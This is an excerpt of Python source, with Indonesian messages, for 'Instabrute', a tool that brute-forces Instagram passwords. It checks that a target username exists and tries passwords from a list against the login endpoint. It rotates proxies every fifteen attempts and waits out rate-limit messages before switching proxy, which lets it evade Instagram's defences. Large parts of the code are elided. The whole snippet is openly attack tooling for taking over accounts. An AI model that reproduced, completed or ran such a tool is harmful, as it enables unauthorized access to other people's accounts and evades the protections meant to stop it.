...
class Instabrute():
	def __init__(self, username, passwords):
		...
		if not self.userExists():
			exit('[*] Tidak Bisa Menemukan Username "%s"' % self.username)
	...
	def _next(self):
		if self.attempts % 15 == 0 and self.attempts != 0:
			print ('[*] Kita Butuh Untuk Mengubah Proxy :v')
			setProxy()
	...
	def login(self):
		...
		if 'authenticated' in r.text:
			if r.json()['authenticated']:
				exit('[%s] YEYY, Passwordnya adalah "%s"' % (str(self.attempts+1), self.passwords[0]))
				#update csrf token after login try (if you want to keep the session)
				#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
			else:
				print ('[%s] Tidak Bisa Login Dengan "%s"' % (str(self.attempts+1), self.passwords[0]))
			...
			if 'message' in r.text:
				if r.json()['message'] == 'Harap tunggu beberapa menit sebelum Anda mencoba lagi.':
					print ('[MESSAGE] Harap tunggu beberapa menit sebelum Anda mencoba lagi.')
					countdown(60*15)
					setProxy()
